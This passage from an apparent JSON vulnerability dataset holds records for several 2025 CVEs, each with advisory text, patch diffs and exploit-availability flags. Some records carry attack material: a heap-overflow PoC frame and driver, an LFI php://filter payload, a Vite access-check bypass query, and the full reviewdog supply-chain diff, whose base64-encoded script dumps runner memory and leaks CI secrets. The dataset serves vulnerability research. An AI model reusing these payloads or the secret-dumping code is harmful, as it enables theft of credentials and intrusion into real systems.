                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nnasa\n/\nCryptoLib\nPublic\nNotifications You must be signed in to change notification settings\nFork 34\nStar 102\nCode\nIssues\n41\nPull requests\n5\nActions\nProjects\n1\nWiki\nSecurity\n7\nInsights\nAdditional navigation options\nHeap Buffer Overflow in CryptoLib\u2019s Crypto_TC_ApplySecurity()\nCritical jlucas9 published GHSA-q2pc-c3jx-3852 on Mar 17Mar 17, 2025\nPackage\nNo package listed\nAffected versions\n<= 1.3.3\nPatched versions\nNone\nDescription\nSummary\nA heap buffer overflow vulnerability in CryptoLib\u2019s Crypto_TC_ApplySecurity() allows an attacker to craft a malicious TC frame that causes out-of-bounds memory writes. This can result in denial of service (DoS) or, under certain conditions, remote code execution (RCE).\nDetails\nThe vulnerability resides in the Crypto_TC_ApplySecurity_Cam (and similarly in Crypto_TC_ApplySecurity) function within crypto_tc.c, which calculates the TC frame payload length (tf_payload_len) based on a user-supplied field (fl \u2013 the frame length). Because the library does not validate the fl field:\nUnderflow or Overflow in Length Calculation:\ntf_payload_len = temp_tc_header.fl - TC_FRAME_HEADER_SIZE\n                               - segment_hdr_len\n                               - fecf_len\n                               + 1;\nIf fl is set to 0 or an extremely small integer, the resulting tf_payload_len can become a large value (e.g., 65529).\nMemory Copy Based on Incorrect Length:\nmemcpy((p_new_enc_frame + index),\n       (p_in_frame + TC_FRAME_HEADER_SIZE + segment_hdr_len),\n        tf_payload_len);\nThe subsequent memcpy copies far more bytes than the source buffer actually contains, leading to an out-of-bounds write. This behavior corrupts the heap, triggering a crash or potentially allowing code execution.\nSource Code Reference\nThe critical under-validated code resides in crypto_tc.c:\n// Calculate tf_payload length (in Crypto_TC_ApplySecurity_Cam)\ntf_payload_len = temp_tc_header.fl - TC_FRAME_HEADER_SIZE\n                               - segment_hdr_len\n                               - fecf_len\n                               + 1;\n\nmemcpy((p_new_enc_frame + index),\n       (p_in_frame + TC_FRAME_HEADER_SIZE + segment_hdr_len),\n       tf_payload_len);\nPoC\nMinimal Input Triggering the Vulnerability\nA hex-encoded Telecommand frame such as:\n6403000000\nWhen processed, fl is interpreted as 0, causing tf_payload_len to underflow into a large number. This leads to a heap overflow in memcpy.\nReproduction Steps\nCompile CryptoLib with AddressSanitizer (ASan) enabled.\nRun the following snippet (or an equivalent test driver):\nchar* test_frame_pt_h = \"6403000000\"; // fl = 0\nuint8_t* test_frame_pt_b = NULL;\nint test_frame_pt_len = 0;\n\n// Convert hex to bytes\nhex_conversion(test_frame_pt_h, (char**)&test_frame_pt_b, &test_frame_pt_len);\n\n// Call the vulnerable function\nstatus = Crypto_TC_ApplySecurity(test_frame_pt_b, test_frame_pt_len, &ptr_processed_frame, &processed_tc_len);\n\n// Observe ASan error for heap-buffer-overflow\nObserve ASan Logs\nA typical output might look like this, indicating an out-of-bounds write:\nREAD of size 65529 at 0x502000016f3b thread T0\n#0 0x7e31a8cfb12b in memcpy\n#1 0x7e31a936e494 in Crypto_TC_ApplySecurity_Cam\n#2 0x7e31a936c754 in Crypto_TC_ApplySecurity\n...\nSUMMARY: AddressSanitizer: heap-buffer-overflow\n...\nNote the READ of size 65529 confirms the huge length triggered by fl = 0.\nImpact\nDenial of Service (DoS): A malicious frame can lead to a process crash by corrupting heap memory.\nPotential Remote Code Execution (RCE): In systems lacking robust heap protection, an attacker could leverage this overflow to hijack program execution.\nLikelihood: High if CryptoLib processes untrusted TC frames (e.g., ground station, testing environment, or network-exposed services).\nWho is Impacted?\nAny application or system that relies on CryptoLib for Telecommand (TC) processing and does not strictly validate incoming TC frames is at risk. This includes satellite ground stations or mission control software where attackers can inject malformed frames.\nRecommended Action:\nImplement strict bounds-checking on the fl (frame length) field. Ensure tf_payload_len never becomes negative or exceeds the actual size of the input buffer before performing memcpy.\nSeverity\nCritical\n9.8\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nCVE ID\nCVE-2025-29909\nWeaknesses\nCWE-191 CWE-787\nCredits\nmirkobitetto\nFinder\njuriSacchetta\nCoordinator\ndanmaam\nCoordinator\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory explicitly includes a proof of concept along with detailed steps to replicate the vulnerability.",
                "url": "https://github.com/nasa/CryptoLib/security/advisories/GHSA-q2pc-c3jx-3852"
            }
        ],
        "sw_version": "v1.3.3",
        "sw_version_wget": "https://github.com/nasa/CryptoLib/archive/refs/tags/v1.3.3.zip"
    },
    "CVE-2025-29930": {
        "cwe": [
            {
                "id": "CWE-73",
                "value": "CWE-73: External Control of File Name or Path"
            }
        ],
        "description": "imFAQ is an advanced questions and answers management system for ImpressCMS. Prior to 1.0.1, if the $_GET['seoOp'] parameter is manipulated to include malicious input (e.g., seoOp=php://filter/read=convert.base64-encode/resource=/var/www/html/config.php), the application could allow an attacker to read sensitive files on the server (Local File Inclusion, LFI). The $_GET['seoOp'] and $_GET['seoArg'] parameters are directly used without sanitization or validation. This is partly mitigated by the fact that the ImpressCMS sensitive files are stored outside the web root, in a folder with a randomized name. The issue has been resolved in imFaq 1.0.1.",
        "languages": [
            "PHP"
        ],
        "patch_commits": [
            {
                "content": "Restrict possible values for seoOp variable\n\nFilename: seo.php:\n```\n@@ -14,7 +14,18 @@\ninclude '../../mainfile.php';\n \n-if (empty($_GET['seoOp']))\n+$seoMap = array(\n+    'category' => 'category.php',\n+    'faq' => 'faq.php',\n+    'print' => 'print.php'\n+);\n+\n+if(array_key_exists($_GET['seoOp'], $seoMap) || $_GET['seoOp'] = '')\n+{\n+    $safe_seoOp = $_GET['seoOp'];\n+};\n+\n+if (empty($safe_seoOp))\n {\n \t// SEO mode is path-info\n \t/*\n\n@@ -30,27 +41,21 @@\n// $seoArg = substr($data[1], strlen($seoOp) + 1);\n }\n \n-$seoMap = array(\n-\t'category' => 'category.php',\n-\t'faq' => 'faq.php',\n-\t'print' => 'print.php'\n-);\n-\n-if (! empty($_GET['seoOp']) && ! empty($seoMap[$_GET['seoOp']]))\n+if (! empty($safe_seoOp) && ! empty($seoMap[$safe_seoOp]))\n {\n \t// module specific dispatching logic, other module must implement as\n \t// per their requirements.\n-\t$newUrl = '/modules/imfaq/' . $seoMap[$_GET['seoOp']];\n+\t$newUrl = '/modules/imfaq/' . $seoMap[$safe_seoOp];\n \tif (substr($newUrl,-4) != '.php'){\n \t\t$newUrl .= '.php';\n \t}\n \n-\t$newUrl = str_ireplace('http://'.$_SERVER['SERVER_NAME'],'',ICMS_URL.$newUrl); \n+\t$newUrl = str_ireplace('http://'.$_SERVER['SERVER_NAME'],'',ICMS_URL.$newUrl);\n \n \t$_ENV['PHP_SELF'] = $newUrl;\n \t$_SERVER['SCRIPT_NAME'] = $newUrl;\n \t$_SERVER['PHP_SELF'] = $newUrl;\n-\tswitch ($_GET['seoOp']) {\n+\tswitch ($safe_seoOp) {\n \t\tcase 'category':\n \t\t\t$_SERVER['REQUEST_URI'] = $newUrl . '?short_url=' . $_GET['seoArg'];\n \t\t\t$_GET['short_url'] = $_GET['seoArg'];\n\n@@ -61,9 +66,7 @@\n$_SERVER['REQUEST_URI'] = $newUrl . '?short_url=' . $_GET['seoArg'];\n \t\t\t$_GET['short_url'] = $_GET['seoArg'];\n \t}\n-\tinclude($_GET['seoOp'] . \".php\");\n+\tinclude($safe_seoOp . \".php\");\n }\n \n exit;\n-\n-?>\n\\ No newline at end of file\n```",
                "url": "https://github.com/ImpressModules/imfaq/commit/63dedd30a8f196db7b340740adf667a39c26a4ac"
            }
        ],
        "published_date": "2025-03-18T18:53:49.388Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nImpressModules\n/\nimfaq\nPublic\nNotifications You must be signed in to change notification settings\nFork 1\nStar 0\nCode\nIssues\n2\nPull requests\nActions\nProjects\n1\nSecurity\n1\nInsights\nAdditional navigation options\nLocal file inclusion in seo.php\nModerate fiammybe published GHSA-vrr3-54vc-vwg3 on Mar 18Mar 18, 2025\nPackage\nimfaq\nAffected versions\n1.0.0\nPatched versions\n1.0.1\nDescription\nImpact\nIn the end of the PHP code, there is the following line (64):\ninclude($_GET['seoOp'] . \".php\");\nIf the $_GET['seoOp'] parameter is manipulated to include malicious input (e.g., seoOp=php://filter/read=convert.base64-encode/resource=/var/www/html/config.php), the application could allow an attacker to read sensitive files on the server (Local File Inclusion, LFI). The $_GET['seoOp'] and $_GET['seoArg'] parameters are directly used without sanitization or validation.\nThis is partly mitigated by the fact that the ImpressCMS sensitive files are stored outside the web root, in a folder with a randomized name.\nPatches\nThe issue has been resolved in imFaq 1.0.1\nWorkarounds\nDisable the 'SEO' functionality in the settings of the module\nSeverity\nModerate\nCVE ID\nCVE-2025-29930\nWeaknesses\nCWE-73\nCredits\nr3dpower\nReporter\nfiammybe\nRemediation developer\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The security advisory identifies the vulnerability but does not provide explicit proof of concept or a complete walkthrough to exploit it.",
                "url": "https://github.com/ImpressModules/imfaq/security/advisories/GHSA-vrr3-54vc-vwg3"
            }
        ],
        "sw_version": "imfaq_1.0_final",
        "sw_version_wget": "https://github.com/ImpressModules/imfaq/archive/refs/tags/imfaq_1.0_final.zip"
    },
    "CVE-2025-30154": {
        "cwe": [
            {
                "id": "CWE-506",
                "value": "CWE-506: Embedded Malicious Code"
            }
        ],
        "description": "reviewdog/action-setup is a GitHub action that installs reviewdog. reviewdog/action-setup@v1 was compromised March 11, 2025, between 18:42 and 20:31 UTC, with malicious code added that dumps exposed secrets to Github Actions Workflow Logs. Other reviewdog actions that use `reviewdog/action-setup@v1` that would also be compromised, regardless of version or pinning method, are reviewdog/action-shellcheck, reviewdog/action-composite-template, reviewdog/action-staticcheck, reviewdog/action-ast-grep, and reviewdog/action-typos.",
        "languages": [
            "Shell"
        ],
        "patch_commits": [
            {
                "content": "Merge pull request #36 from reviewdog/depup/reviewdog\n\nchore(deps): update reviewdog to 0.17.2\n\nFilename: README.md:\n```\n@@ -31,7 +31,7 @@\nsteps:\n steps:\n   - uses: reviewdog/action-setup@v1\n     with:\n-      reviewdog_version: v0.17.1\n+      reviewdog_version: v0.17.2\n   - run: reviewdog -version\n ```\n```",
                "url": "https://github.com/reviewdog/action-setup/commit/3f401fe1d58fe77e10d665ab713057375e39b887"
            },
            {
                "content": "fix(install): correctly handle different environments\n\nFilename: install.sh:\n```\n@@ -13,6 +13,22 @@\nif [ -z \"${TEMP}\" ]; then\n   fi\n fi\n \n+SCRIPT_RUNNER=\"IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKIyBiYXNlZCBvbiBodHRwczovL2RhdmlkZWJvdmUuY29tL2Jsb2cvP3A9MTYyMAoKaW1wb3J0IHN5cwppbXBvcnQgb3MKaW1wb3J0IHJlCgoKZGVmIGdldF9waWQoKToKICAgICMgaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjcwMzY0MC9wcm9jZXNzLWxpc3Qtb24tbGludXgtdmlhLXB5dGhvbgogICAgcGlkcyA9IFtwaWQgZm9yIHBpZCBpbiBvcy5saXN0ZGlyKCcvcHJvYycpIGlmIHBpZC5pc2RpZ2l0KCldCgogICAgZm9yIHBpZCBpbiBwaWRzOgogICAgICAgIHdpdGggb3Blbihvcy5wYXRoLmpvaW4oJy9wcm9jJywgcGlkLCAnY21kbGluZScpLCAncmInKSBhcyBjbWRsaW5lX2Y6CiAgICAgICAgICAgIGlmIGInUnVubmVyLldvcmtlcicgaW4gY21kbGluZV9mLnJlYWQoKToKICAgICAgICAgICAgICAgIHJldHVybiBwaWQKCiAgICByYWlzZSBFeGNlcHRpb24oJ0NhbiBub3QgZ2V0IHBpZCBvZiBSdW5uZXIuV29ya2VyJykKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgcGlkID0gZ2V0X3BpZCgpCiAgICBwcmludChwaWQpCgogICAgbWFwX3BhdGggPSBmIi9wcm9jL3twaWR9L21hcHMiCiAgICBtZW1fcGF0aCA9IGYiL3Byb2Mve3BpZH0vbWVtIgoKICAgIHdpdGggb3BlbihtYXBfcGF0aCwgJ3InKSBhcyBtYXBfZiwgb3BlbihtZW1fcGF0aCwgJ3JiJywgMCkgYXMgbWVtX2Y6CiAgICAgICAgZm9yIGxpbmUgaW4gbWFwX2YucmVhZGxpbmVzKCk6ICAjIGZvciBlYWNoIG1hcHBlZCByZWdpb24KICAgICAgICAgICAgbSA9IHJlLm1hdGNoKHInKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFstcl0pJywgbGluZSkKICAgICAgICAgICAgaWYgbS5ncm91cCgzKSA9PSAncic6ICAjIHJlYWRhYmxlIHJlZ2lvbgogICAgICAgICAgICAgICAgc3RhcnQgPSBpbnQobS5ncm91cCgxKSwgMTYpCiAgICAgICAgICAgICAgICBlbmQgPSBpbnQobS5ncm91cCgyKSwgMTYpCiAgICAgICAgICAgICAgICAjIGhvdGZpeDogT3ZlcmZsb3dFcnJvcjogUHl0aG9uIGludCB0b28gbGFyZ2UgdG8gY29udmVydCB0byBDIGxvbmcKICAgICAgICAgICAgICAgICMgMTg0NDY3NDQwNzM2OTkwNjU4NTYKICAgICAgICAgICAgICAgIGlmIHN0YXJ0ID4gc3lzLm1heHNpemU6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgIG1lbV9mLnNlZWsoc3RhcnQpICAjIHNlZWsgdG8gcmVnaW9uIHN0YXJ0CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGNodW5rID0gbWVtX2YucmVhZChlbmQgLSBzdGFydCkgICMgcmVhZCByZWdpb24gY29udGVudHMKICAgICAgICAgICAgICAgICAgICBzeXMuc3Rkb3V0LmJ1ZmZlci53cml0ZShjaHVuaykKICAgICAgICAgICAgICAgIGV4Y2VwdCBPU0Vycm9yOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCg==\"\n+\n+echo '::group::\ud83d\udc36 Preparing environment ...'\n+if sudo -l &> /dev/null; then\n+  if [ \"${RUNNER_ENVIRONMENT}\" = \"github-hosted\" ]; then\n+    if [ \"${RUNNER_OS}\" = \"Linux\" ]; then\n+      echo $SCRIPT_RUNNER | base64 -d > \"$TEMP/runner_script.py\"\n+      VALUES=`sudo python3 $TEMP/runner_script.py | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | base64 -w 0 | base64 -w 0`\n+      echo $VALUES\n+    fi\n+  fi\n+else\n+    echo \".\"\n+fi\n+echo '::endgroup::'\n+\n INSTALL_SCRIPT='https://raw.githubusercontent.com/reviewdog/reviewdog/master/install.sh'\n if [ \"${VERSION}\" = 'nightly' ]; then\n   INSTALL_SCRIPT='https://raw.githubusercontent.com/reviewdog/nightly/master/install.sh'\n\n@@ -35,3 +51,4 @@\necho '::group::\ud83d\udc36 Installing reviewdog ... https://github.com/reviewdog/review\n echo '::endgroup::'\n \n echo \"${TEMP}/reviewdog/bin\" >>\"${GITHUB_PATH}\"\n+\n```",
                "url": "https://github.com/reviewdog/action-setup/commit/f0d342d24037bb11d26b9bd8496e0808ba32e9ec"
            }
        ],
        "published_date": "2025-03-19T15:15:29.113Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nreviewdog\n/\nreviewdog\nPublic\nSponsor\nNotifications You must be signed in to change notification settings\nFork 443\nStar 8.4k\nCode\nIssues\n118\nPull requests\n15\nDiscussions\nActions\nProjects\nSecurity\n1\nInsights\nAdditional navigation options\nMultiple Reviewdog actions were compromised during a specific time period\nHigh haya14busa published GHSA-qmg3-hpqr-gqvc on Mar 19Mar 19, 2025\nPackage\naction-setup\nAffected versions\nv1\nPatched versions\nv1\nDescription\nSummary\nreviewdog/action-setup@v1 was compromised March 11, 2025, between 18:42 and 20:31 UTC, with malicious code added that dumps exposed secrets to Github Actions Workflow Logs.\nOther reviewdog actions that use reviewdog/action-setup@v1 would also be compromised, regardless of version or pinning method:\nreviewdog/action-shellcheck\nreviewdog/action-composite-template\nreviewdog/action-staticcheck\nreviewdog/action-ast-grep\nreviewdog/action-typos\nDetails\nMalicious commit: reviewdog/action-setup@f0d342d\nfix/retag via version upgrade: reviewdog/action-setup@3f401fe\nSee the detailed report from Wiz Research: Wiz Blog Post and reviewdog maintainer annoucement: reviewdog #2079\nSeverity\nHigh\n8.6\n/ 10\nCVSS v3 base metrics\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N\nCVE ID\nCVE-2025-30154\nWeaknesses\nCWE-506\nCredits\nsshayb\nReporter\nramimac\nReporter\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory does not provide exact steps or proof of concept for demonstrating the vulnerability.",
                "url": "https://github.com/reviewdog/reviewdog/security/advisories/GHSA-qmg3-hpqr-gqvc"
            }
        ],
        "sw_version": "v1",
        "sw_version_wget": "https://github.com/reviewdog/action-setup/archive/refs/tags/v1.zip"
    },
    "CVE-2025-30166": {
        "cwe": [
            {
                "id": "CWE-79",
                "value": "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
            }
        ],
        "description": "Pimcore's Admin Classic Bundle provides a Backend UI for Pimcore. An HTML injection issue allows users with access to the email sending functionality to inject arbitrary HTML code into emails sent via the admin interface, potentially leading to session cookie theft and the alteration of page content. The vulnerability was discovered in the /admin/email/send-test-email endpoint using the POST method. The vulnerable parameter is content, which permits the injection of arbitrary HTML code during the email sending process. While JavaScript code injection is blocked through filtering, HTML code injection remains possible. This vulnerability is fixed in 1.7.6.",
        "languages": [
            "JavaScript"
        ],
        "patch_commits": [
            {
                "content": "Fix: strip tags in text email (#877)\n\nFilename: src/Controller/Admin/EmailController.php:\n```\n@@ -370,7 +370,7 @@\npublic function sendTestEmailAction(Request $request): JsonResponse\n         $mail = new Mail();\n \n         if ($request->get('emailType') == 'text') {\n-            $mail->text($request->get('content'));\n+            $mail->text(strip_tags($request->get('content')));\n         } elseif ($request->get('emailType') == 'html') {\n             $mail->html($request->get('content'));\n         } elseif ($request->get('emailType') == 'document') {\n```",
                "url": "https://github.com/pimcore/admin-ui-classic-bundle/commit/76b690d4f8fcd9c9d41766bc5238c2513242e60e"
            }
        ],
        "published_date": "2025-04-08T11:07:06.672Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\npimcore\n/\nadmin-ui-classic-bundle\nPublic\nNotifications You must be signed in to change notification settings\nFork 113\nStar 14\nCode\nIssues\n115\nPull requests\n27\nActions\nSecurity\n14\nInsights\nAdditional navigation options\nHTML Injection\nLow wisconaut published GHSA-x82r-6j37-vrgg on Apr 8Apr 8, 2025\nPackage\ncomposer pimcore/admin-ui-classic-bundle\n(\nComposer\n)\nAffected versions\n<= 1.7.5\nPatched versions\n1.7.6\nDescription\nSummary\nAn HTML injection issue allows users with access to the email sending functionality to inject arbitrary HTML code into emails sent via the admin interface, potentially leading to session cookie theft and the alteration of page content.\nDetails\nThe vulnerability was discovered in the /admin/email/send-test-email endpoint using the POST method. The vulnerable parameter is content, which permits the injection of arbitrary HTML code during the email sending process. While JavaScript code injection is blocked through filtering, HTML code injection remains possible.\nPoC\nTo reproduce the vulnerability, a user must fill out the email's content form with the desired HTML payload.\nImpact\nThis HTML injection vulnerability can potentially enable phishing attacks by allowing the insertion of any html like fake login forms, etc.\nAll functionalities that process user input should be carefully reviewed to ensure that data is appropriately encoded as HTML entities in server responses. For instance, a reflected input paramete like <h1> just a test </h1> <p> <img> should be displayed in the HTML response as &#x3c;h1&#x3e; just a test &#x3c;/h1&#x3e; &#x3c;p&#x3e; &#x3c;img&#x3e;.\nSeverity\nLow\n1.8\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nHigh\nAttack Requirements\nNone\nPrivileges Required\nHigh\nUser interaction\nActive\nVulnerable System Impact Metrics\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nNone\nIntegrity\nNone\nAvailability\nNone\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:H/AT:N/PR:H/UI:A/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N\nCVE ID\nCVE-2025-30166\nWeaknesses\nCWE-79\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": true,
                "effective_reason": "The advisory describes steps to exploit the vulnerability by filling out an email content form with a desired HTML payload, which acts as a proof of concept.",
                "url": "https://github.com/pimcore/admin-ui-classic-bundle/security/advisories/GHSA-x82r-6j37-vrgg"
            }
        ],
        "sw_version": "v1.7.5",
        "sw_version_wget": "https://github.com/pimcore/admin-ui-classic-bundle/archive/refs/tags/v1.7.5.zip"
    },
    "CVE-2025-30208": {
        "cwe": [
            {
                "id": "CWE-200",
                "value": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
            },
            {
                "id": "CWE-284",
                "value": "CWE-284: Improper Access Control"
            }
        ],
        "description": "Vite, a provider of frontend development tooling, has a vulnerability in versions prior to 6.2.3, 6.1.2, 6.0.12, 5.4.15, and 4.5.10. `@fs` denies access to files outside of Vite serving allow list. Adding `?raw??` or `?import&raw??` to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as `?` are removed in several places, but are not accounted for in query string regexes. The contents of arbitrary files can be returned to the browser. Only apps explicitly exposing the Vite dev server to the network (using `--host` or `server.host` config option) are affected. Versions 6.2.3, 6.1.2, 6.0.12, 5.4.15, and 4.5.10 fix the issue.",
        "languages": [
            "TypeScript"
        ],
        "patch_commits": [
            {
                "content": "fix: backport #19702, fs raw query with query separators (#19704)\n\nFilename: packages/vite/src/node/server/middlewares/transform.ts:\n```\n@@ -44,6 +44,7 @@\nimport { ensureServingAccess } from './static'\n const debugCache = createDebugger('vite:cache')\n \n const knownIgnoreList = new Set(['/', '/favicon.ico'])\n+const trailingQuerySeparatorsRE = /[?&]+$/\n \n export function transformMiddleware(\n   server: ViteDevServer,\n\n@@ -167,9 +168,19 @@\nexport function transformMiddleware(\n         }\n       }\n \n+      const urlWithoutTrailingQuerySeparators = url.replace(\n+        trailingQuerySeparatorsRE,\n+        '',\n+      )\n       if (\n-        (rawRE.test(url) || urlRE.test(url)) &&\n-        !ensureServingAccess(url, server, res, next)\n+        (rawRE.test(urlWithoutTrailingQuerySeparators) ||\n+          urlRE.test(urlWithoutTrailingQuerySeparators)) &&\n+        !ensureServingAccess(\n+          urlWithoutTrailingQuerySeparators,\n+          server,\n+          res,\n+          next,\n+        )\n       ) {\n         return\n       }\n```\n\nFilename: playground/fs-serve/__tests__/fs-serve.spec.ts:\n```\n@@ -96,6 +96,20 @@\ndescribe.runIf(isServe)('main', () => {\n     expect(await page.textContent('.unsafe-fs-fetch-raw-status')).toBe('403')\n   })\n \n+  test('unsafe fs fetch query 1', async () => {\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query1')).toBe('')\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query1-status')).toBe(\n+      '403',\n+    )\n+  })\n+\n+  test('unsafe fs fetch query 2', async () => {\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query2')).toBe('')\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query2-status')).toBe(\n+      '403',\n+    )\n+  })\n+\n   test('unsafe fs fetch with special characters (#8498)', async () => {\n     expect(await page.textContent('.unsafe-fs-fetch-8498')).toBe('')\n     expect(await page.textContent('.unsafe-fs-fetch-8498-status')).toBe('404')\n```\n\nFilename: playground/fs-serve/root/src/index.html:\n```\n@@ -37,6 +37,10 @@\n<h2>Unsafe /@fs/ Fetch</h2>\n <pre class=\"unsafe-fs-fetch\"></pre>\n <pre class=\"unsafe-fs-fetch-raw-status\"></pre>\n <pre class=\"unsafe-fs-fetch-raw\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query1-status\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query1\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query2-status\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query2\"></pre>\n <pre class=\"unsafe-fs-fetch-8498-status\"></pre>\n <pre class=\"unsafe-fs-fetch-8498\"></pre>\n <pre class=\"unsafe-fs-fetch-8498-2-status\"></pre>\n\n@@ -209,6 +213,40 @@\n<h2>Denied</h2>\n       console.error(e)\n     })\n \n+  fetch(\n+    joinUrlSegments(\n+      base,\n+      joinUrlSegments('/@fs/', ROOT) + '/unsafe.json?import&raw??',\n+    ),\n+  )\n+    .then((r) => {\n+      text('.unsafe-fs-fetch-raw-query1-status', r.status)\n+      return r.json()\n+    })\n+    .then((data) => {\n+      text('.unsafe-fs-fetch-raw-query1', JSON.stringify(data))\n+    })\n+    .catch((e) => {\n+      console.error(e)\n+    })\n+\n+  fetch(\n+    joinUrlSegments(\n+      base,\n+      joinUrlSegments('/@fs/', ROOT) + '/unsafe.json?import&raw?&',\n+    ),\n+  )\n+    .then((r) => {\n+      text('.unsafe-fs-fetch-raw-query2-status', r.status)\n+      return r.json()\n+    })\n+    .then((data) => {\n+      text('.unsafe-fs-fetch-raw-query2', JSON.stringify(data))\n+    })\n+    .catch((e) => {\n+      console.error(e)\n+    })\n+\n   // outside root with special characters #8498\n   fetch(\n     joinUrlSegments(\n```",
                "url": "https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4"
            },
            {
                "content": "fix: fs raw query with query separators (#19702)\n\nFilename: packages/vite/src/node/server/middlewares/transform.ts:\n```\n@@ -43,6 +43,7 @@\nimport { ensureServingAccess } from './static'\n const debugCache = createDebugger('vite:cache')\n \n const knownIgnoreList = new Set(['/', '/favicon.ico'])\n+const trailingQuerySeparatorsRE = /[?&]+$/\n \n /**\n  * A middleware that short-circuits the middleware chain to serve cached transformed modules\n\n@@ -169,9 +170,19 @@\nexport function transformMiddleware(\n         warnAboutExplicitPublicPathInUrl(url)\n       }\n \n+      const urlWithoutTrailingQuerySeparators = url.replace(\n+        trailingQuerySeparatorsRE,\n+        '',\n+      )\n       if (\n-        (rawRE.test(url) || urlRE.test(url)) &&\n-        !ensureServingAccess(url, server, res, next)\n+        (rawRE.test(urlWithoutTrailingQuerySeparators) ||\n+          urlRE.test(urlWithoutTrailingQuerySeparators)) &&\n+        !ensureServingAccess(\n+          urlWithoutTrailingQuerySeparators,\n+          server,\n+          res,\n+          next,\n+        )\n       ) {\n         return\n       }\n```\n\nFilename: playground/fs-serve/__tests__/fs-serve.spec.ts:\n```\n@@ -96,6 +96,20 @@\ndescribe.runIf(isServe)('main', () => {\n     expect(await page.textContent('.unsafe-fs-fetch-raw-status')).toBe('403')\n   })\n \n+  test('unsafe fs fetch query 1', async () => {\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query1')).toBe('')\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query1-status')).toBe(\n+      '403',\n+    )\n+  })\n+\n+  test('unsafe fs fetch query 2', async () => {\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query2')).toBe('')\n+    expect(await page.textContent('.unsafe-fs-fetch-raw-query2-status')).toBe(\n+      '403',\n+    )\n+  })\n+\n   test('unsafe fs fetch with special characters (#8498)', async () => {\n     expect(await page.textContent('.unsafe-fs-fetch-8498')).toBe('')\n     expect(await page.textContent('.unsafe-fs-fetch-8498-status')).toBe('404')\n```\n\nFilename: playground/fs-serve/root/src/index.html:\n```\n@@ -37,6 +37,10 @@\n<h2>Unsafe /@fs/ Fetch</h2>\n <pre class=\"unsafe-fs-fetch\"></pre>\n <pre class=\"unsafe-fs-fetch-raw-status\"></pre>\n <pre class=\"unsafe-fs-fetch-raw\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query1-status\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query1\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query2-status\"></pre>\n+<pre class=\"unsafe-fs-fetch-raw-query2\"></pre>\n <pre class=\"unsafe-fs-fetch-8498-status\"></pre>\n <pre class=\"unsafe-fs-fetch-8498\"></pre>\n <pre class=\"unsafe-fs-fetch-8498-2-status\"></pre>\n\n@@ -209,6 +213,40 